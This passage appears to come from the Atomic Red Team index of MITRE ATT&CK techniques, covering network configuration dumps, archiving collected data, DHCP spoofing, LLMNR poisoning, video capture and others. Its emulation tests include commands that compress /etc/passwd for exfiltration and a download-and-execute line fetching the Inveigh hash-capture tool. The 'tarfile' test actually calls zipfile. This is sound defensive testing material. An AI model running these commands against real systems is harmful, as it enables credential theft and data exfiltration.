        path_to_input_file:
          description: Path to the file that you want to compress
          type: path
          default: "/etc/passwd"
        path_to_output_file:
          description: Path of the file that you want your .bz2 file to be
          type: path
          default: "/tmp/passwd.bz2"
      dependency_executor_name: bash
      dependencies:
      - description: 'Requires Python

          '
        prereq_command: 'which python || which python3

          '
        get_prereq_command: 'echo "please install python to run this test"; exit 1

          '
      executor:
        name: bash
        elevation_required: false
        command: |
          which_python=`which python || which python3`
          $which_python -c "import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();"
        cleanup_command: 'rm #{path_to_output_file}

          '
    - name: Compressing data using zipfile in Python (Linux)
      auto_generated_guid: 001a042b-859f-44d9-bf81-fd1c4e2200b0
      description: 'Uses zipfile from Python to compress files

        '
      supported_platforms:
      - linux
      input_arguments:
        path_to_input_file:
          description: Path to the file that you want to compress
          type: path
          default: "/etc/passwd"
        path_to_output_file:
          description: Path of the file that you want your .zip file to be
          type: path
          default: "/tmp/passwd.zip"
      dependency_executor_name: bash
      dependencies:
      - description: 'Requires Python

          '
        prereq_command: 'which python || which python3

          '
        get_prereq_command: 'echo "please install python to run this test"; exit 1

          '
      executor:
        name: bash
        elevation_required: false
        command: |
          which_python=`which python || which python3`
          $which_python -c "from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')"
        cleanup_command: 'rm #{path_to_output_file}

          '
    - name: Compressing data using tarfile in Python (Linux)
      auto_generated_guid: e86f1b4b-fcc1-4a2a-ae10-b49da01458db
      description: 'Uses tarfile from Python to compress files

        '
      supported_platforms:
      - linux
      input_arguments:
        path_to_input_file:
          description: Path to the file that you want to compress
          type: path
          default: "/etc/passwd"
        path_to_output_file:
          description: Path of the file that you want your .tar.gz file to be
          type: path
          default: "/tmp/passwd.tar.gz"
      dependency_executor_name: bash
      dependencies:
      - description: 'Requires Python

          '
        prereq_command: 'which python || which python3

          '
        get_prereq_command: 'echo "please install python to run this test"; exit 1

          '
      executor:
        name: bash
        elevation_required: false
        command: "which_python=`which python || which python3`\n$which_python -c \"from
          zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"
          \n"
        cleanup_command: 'rm #{path_to_output_file}

          '
  T1602.002:
    technique:
      x_mitre_platforms:
      - Network
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd
      type: attack-pattern
      created: '2020-10-20T00:08:21.745Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1602.002
        url: https://attack.mitre.org/techniques/T1602/002
      - source_name: US-CERT TA18-106A Network Infrastructure Devices 2018
        url: https://us-cert.cisa.gov/ncas/alerts/TA18-106A
        description: US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors
          Targeting Network Infrastructure Devices. Retrieved October 19, 2020.
      - source_name: Cisco Blog Legacy Device Attacks
        url: https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
        description: Omar Santos. (2020, October 19). Attackers Continue to Target
          Legacy Devices. Retrieved October 20, 2020.
      - source_name: US-CERT TA18-068A 2018
        url: https://www.us-cert.gov/ncas/alerts/TA18-086A
        description: US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted
          by Cyber Actors. Retrieved October 2, 2019.
      modified: '2022-02-17T19:50:46.948Z'
      name: Network Device Configuration Dump
      description: "Adversaries may access network configuration files to collect
        sensitive data about the device and the network. The network configuration
        is a file containing parameters that determine the operation of the device.
        The device typically stores an in-memory copy of the configuration while operating,
        and a separate configuration on non-volatile storage to load after device
        reset. Adversaries can inspect the configuration files to reveal information
        about the target network and its layout, the network device and its software,
        or identifying legitimate accounts and credentials for later use.\n\nAdversaries
        can use common management tools and protocols, such as Simple Network Management
        Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation:
        US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog
        Legacy Device Attacks) These tools may be used to query specific data from
        a configuration repository or configure the device to export the configuration
        for later analysis. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: 'Identify network traffic sent or received by untrusted hosts
        or networks. Configure signatures to identify strings that may be found in
        a network device configuration.(Citation: US-CERT TA18-068A 2018)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_permissions_required:
      - Administrator
    atomic_tests: []
  T1560:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a
      type: attack-pattern
      created: '2020-02-20T20:53:45.725Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1560
        url: https://attack.mitre.org/techniques/T1560
      - url: https://en.wikipedia.org/wiki/List_of_file_signatures
        description: Wikipedia. (2016, March 31). List of file signatures. Retrieved
          April 22, 2016.
        source_name: Wikipedia File Header Signatures
      modified: '2022-01-04T18:44:10.398Z'
      name: Archive Collected Data
      description: |-
        An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.

        Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: |-
        Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

        A process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.

        Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Creation'
      - 'Process: Process Creation'
      - 'Script: Script Execution'
      x_mitre_is_subtechnique: false
      identifier: T1560
    atomic_tests:
    - name: Compress Data for Exfiltration With PowerShell
      auto_generated_guid: 41410c60-614d-4b9d-b66e-b0192dd9c597
      description: "An adversary may compress data (e.g., sensitive documents) that
        is collected prior to exfiltration.\nWhen the test completes you should find
        the files from the $env:USERPROFILE directory compressed in a file called
        T1560-data-ps.zip in the $env:USERPROFILE directory \n"
      supported_platforms:
      - windows
      input_arguments:
        input_file:
          description: Path that should be compressed into our output file
          type: path
          default: "$env:USERPROFILE"
        output_file:
          description: Path where resulting compressed data should be placed
          type: path
          default: "$env:USERPROFILE\\T1560-data-ps.zip"
      executor:
        name: powershell
        elevation_required: false
        command: 'dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}

          '
        cleanup_command: 'Remove-Item -path #{output_file} -ErrorAction Ignore'
  T1185:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Justin Warner, ICEBRG
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1185
        external_id: T1185
      - url: https://en.wikipedia.org/wiki/Man-in-the-browser
        description: Wikipedia. (2017, October 28). Man-in-the-browser. Retrieved
          January 10, 2018.
        source_name: Wikipedia Man in the Browser
      - url: https://www.cobaltstrike.com/help-browser-pivoting
        description: Mudge, R. (n.d.). Browser Pivoting. Retrieved January 10, 2018.
        source_name: Cobalt Strike Browser Pivot
      - url: https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses
        description: De Tore, M., Warner, J. (2018, January 15). MALICIOUS CHROME
          EXTENSIONS ENABLE CRIMINALS TO IMPACT OVER HALF A MILLION USERS AND GLOBAL
          BUSINESSES. Retrieved January 17, 2018.
        source_name: ICEBRG Chrome Extensions
      - url: https://web.archive.org/web/20210825130434/https://cobaltstrike.com/downloads/csmanual38.pdf
        description: Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual.
          Retrieved May 24, 2017.
        source_name: cobaltstrike manual
      modified: '2022-02-25T18:58:15.229Z'
      name: Browser Session Hijacking
      description: |-
        Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)

        A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.

        Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: This may be a difficult technique to detect because adversary
        traffic may be masked by normal user traffic. New processes may not be created
        and no additional software dropped to disk. Authentication logs can be used
        to audit logins to specific web applications, but determining malicious logins
        versus benign logins may be difficult if activity matches typical user behavior.
        Monitor for [Process Injection](https://attack.mitre.org/techniques/T1055)
        against browser applications.
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Access'
      - 'Process: Process Modification'
      - 'Logon Session: Logon Session Creation'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1557.003:
    technique:
      modified: '2022-10-21T15:18:16.023Z'
      name: DHCP Spoofing
      description: "Adversaries may redirect network traffic to adversary-owned systems
        by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting
        as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle
        (AiTM) position, adversaries may collect network communications, including
        passed credentials, especially those sent over insecure, unencrypted protocols.
        This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)
        or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP
        is based on a client-server model and has two functionalities: a protocol
        for providing network configuration settings from a DHCP server to a client
        and a mechanism for allocating network addresses to clients.(Citation: rfc2131)
        The typical server-client interaction is as follows: \n\n1. The client broadcasts
        a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which
        includes an available network address. \n\n3. The client broadcasts a `REQUEST`
        message, which includes the network address offered. \n\n4. The server acknowledges
        with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries
        may spoof as a rogue DHCP server on the victim network, from which legitimate
        hosts may receive malicious network configurations. For example, malware can
        act as a DHCP server and provide adversary-owned DNS servers to the victimized
        computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g)
        Through the malicious network configurations, an adversary may achieve the
        AiTM position, route client traffic through adversary-controlled systems,
        and collect information from the client network.\n\nDHCPv6 clients can receive
        network configuration information without being assigned an IP address by
        sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code>
        multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP
        server to respond to this request message with malicious network configurations.\n\nRather
        than establishing an AiTM position, adversaries may also abuse DHCP spoofing
        to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002))
        by generating many broadcast DISCOVER messages to exhaust a networks DHCP
        allocation pool. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: 'Monitor network traffic for suspicious/malicious behavior
        involving DHCP, such as changes in DNS and/or gateway parameters. Additionally,
        monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which
        specify that the IP allocations are low or have run out; these EIDs may indicate
        a denial of service attack.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes)'
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_contributors:
      - Alex Spivakovsky, Pentera
      - Andrew Allen, @whitehat_zero
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5
      created: '2022-03-24T19:30:56.727Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1557/003
        external_id: T1557.003
      - source_name: rfc2131
        description: Droms, R. (1997, March). Dynamic Host Configuration Protocol.
          Retrieved March 9, 2022.
        url: https://datatracker.ietf.org/doc/html/rfc2131
      - source_name: new_rogue_DHCP_serv_malware
        description: Irwin, Ullrich, J. (2009, March 16). new rogue-DHCP server malware.
          Retrieved January 14, 2022.
        url: https://isc.sans.edu/forums/diary/new+rogueDHCP+server+malware/6025/
      - source_name: rfc3315
        description: J. Bound, et al. (2003, July). Dynamic Host Configuration Protocol
          for IPv6 (DHCPv6). Retrieved June 27, 2022.
        url: https://datatracker.ietf.org/doc/html/rfc3315
      - source_name: dhcp_serv_op_events
        description: Microsoft. (2006, August 31).  DHCP Server Operational Events.
          Retrieved March 7, 2022.
        url: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800668(v=ws.11)
      - source_name: solution_monitor_dhcp_scopes
        description: 'Shoemaker, E. (2015, December 31). Solution: Monitor DHCP Scopes
          and Detect Man-in-the-Middle Attacks with PRTG and PowerShell. Retrieved
          March 7, 2022.'
        url: https://lockstepgroup.com/blog/monitor-dhcp-scopes-and-detect-man-in-the-middle-attacks/
      - source_name: w32.tidserv.g
        description: Symantec. (2009, March 22). W32.Tidserv.G. Retrieved January
          14, 2022.
        url: https://web.archive.org/web/20150923175837/http://www.symantec.com/security_response/writeup.jsp?docid=2009-032211-2952-99&tabid=2
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1557.001:
    technique:
      modified: '2022-10-25T15:46:55.393Z'
      name: 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay'
      description: "By responding to LLMNR/NBT-NS network traffic, adversaries may
        spoof an authoritative source for name resolution to force communication with
        an adversary controlled system. This activity may be used to collect or relay
        authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR)
        and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve
        as alternate methods of host identification. LLMNR is based upon the Domain
        Name System (DNS) format and allows hosts on the same local link to perform
        name resolution for other hosts. NBT-NS identifies systems on a local network
        by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries
        can spoof an authoritative source for name resolution on a victim network
        by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know
        the identity of the requested host, effectively poisoning the service so that
        the victims will communicate with the adversary controlled system. If the
        requested host belongs to a resource that requires identification/authentication,
        the username and NTLMv2 hash will then be sent to the adversary controlled
        system. The adversary can then collect the hash information sent over the
        wire through tools that monitor the ports for traffic or through [Network
        Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes
        offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to
        obtain the plaintext passwords.\n\nIn some cases where an adversary has access
        to a system that is in the authentication path between systems or when automated
        scans that use credentials attempt to authenticate to an adversary controlled
        system, the NTLMv1/v2 hashes can be intercepted and relayed to access and
        execute code against a target system. The relay step can happen in conjunction
        with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM
        Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may
        encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB,
        MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\n\nSeveral
        tools may be used to poison name services within local networks such as NBNSpoof,
        Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation:
        GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: |-
        Monitor <code>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient</code> for changes to the "EnableMulticast" DWORD value. A value of 0? indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)

        Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.

        Deploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)
      x_mitre_platforms:
      - Windows
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.4'
      x_mitre_contributors:
      - Eric Kuehn, Secure Ideas
      - Matthew Demaske, Adaptforward
      - Andrew Allen, @whitehat_zero
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      - 'Service: Service Creation'
      type: attack-pattern
      id: attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e
      created: '2020-02-11T19:08:51.677Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1557/001
        external_id: T1557.001
      - source_name: Rapid7 LLMNR Spoofer
        description: Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.
        url: https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response
      - source_name: GitHub Responder
        description: Gaffie, L. (2016, August 25). Responder. Retrieved November 17,
          2017.
        url: https://github.com/SpiderLabs/Responder
      - source_name: Secure Ideas SMB Relay
        description: Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays
          Should Be On Your Mind. Retrieved February 7, 2019.
        url: https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html
      - source_name: TechNet NetBIOS
        description: Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November
          17, 2017.
        url: https://technet.microsoft.com/library/cc958811.aspx
      - source_name: GitHub NBNSpoof
        description: Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.
        url: https://github.com/nomex/nbnspoof
      - source_name: GitHub Conveigh
        description: Robertson, K. (2016, August 28). Conveigh. Retrieved November
          17, 2017.
        url: https://github.com/Kevin-Robertson/Conveigh
      - source_name: byt3bl33d3r NTLM Relaying
        description: Salvati, M. (2017, June 2). Practical guide to NTLM Relaying
          in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February
          7, 2019.
        url: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
      - source_name: Sternsecurity LLMNR-NBTNS
        description: 'Sternstein, J. (2013, November). Local Network Attacks: LLMNR
          and NBT-NS Poisoning. Retrieved November 17, 2017.'
        url: https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning
      - source_name: Wikipedia LLMNR
        description: Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution.
          Retrieved November 17, 2017.
        url: https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.0.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1557.001
    atomic_tests:
    - name: LLMNR Poisoning with Inveigh (PowerShell)
      auto_generated_guid: deecd55f-afe0-4a62-9fba-4d1ba2deb321
      description: Inveigh conducts spoofing attacks and hash/credential captures
        through both packet sniffing and protocol specific listeners/sockets. This
        Atomic will run continuously until you cancel it or it times out.
      supported_platforms:
      - windows
      executor:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
          Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
        name: powershell
        elevation_required: true
  T1056.003:
    technique:
      modified: '2023-03-30T21:01:46.711Z'
      name: Web Portal Capture
      description: |-
        Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.

        This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: File monitoring may be used to detect changes to files in
        the Web directory for organization login pages that do not match with authorized
        updates to the Web server's content.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'File: File Modification'
      x_mitre_system_requirements:
      - An externally facing login portal is configured.
      type: attack-pattern
      id: attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e
      created: '2020-02-11T18:59:50.058Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056/003
        external_id: T1056.003
      - source_name: Volexity Virtual Private Keylogging
        description: 'Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco
          Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.'
        url: https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1125:
    technique:
      modified: '2023-03-30T21:01:37.205Z'
      name: Video Capture
      description: |-
        An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.

        In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_contributors:
      - Praetorian
      x_mitre_detection: |-
        Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

        Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      x_mitre_permissions_required:
      - User
      type: attack-pattern
      id: attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf
      created: '2017-05-31T21:31:37.917Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1125
        external_id: T1125
      - source_name: objective-see 2017 review
        description: Patrick Wardle. (n.d.). Retrieved March 20, 2018.
        url: https://objective-see.com/blog/blog_0x25.html
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1125
    atomic_tests:
    - name: Registry artefact when application use webcam
      auto_generated_guid: 6581e4a7-42e3-43c5-a0d2-5a0d62f9702a
      description: "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n"
      supported_platforms:
      - windows
      executor:
        command: |
          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
        cleanup_command: 'reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe
          /f

          '
        name: command_prompt
  T1213.001:
    technique:
      x_mitre_platforms:
      - SaaS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc
      type: attack-pattern
      created: '2020-02-14T13:09:51.004Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1213.001
        url: https://attack.mitre.org/techniques/T1213/001
      - url: https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html
        description: Atlassian. (2018, January 9). How to Enable User Access Logging.
          Retrieved April 4, 2018.
        source_name: Atlassian Confluence Logging
      modified: '2021-06-08T17:08:08.386Z'
      name: Confluence
      description: |2

        Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:

        * Policies, procedures, and standards
        * Physical / logical network diagrams
        * System architecture diagrams
        * Technical system documentation
        * Testing / development credentials
        * Work / project schedules
        * Source code snippets
        * Links to network shares and other internal resources
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: |-
        Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.

        User access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'Application Log: Application Log Content'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1114.003:
    technique:
      modified: '2023-04-12T20:47:47.583Z'
      name: 'Email Collection: Email Forwarding Rule'
      description: "Adversaries may setup email forwarding rules to collect sensitive
        information. Adversaries may abuse email forwarding rules to monitor the activities
        of a victim, steal information, and further gain intelligence on the victim
        or the victims organization to use as part of further exploits or operations.(Citation:
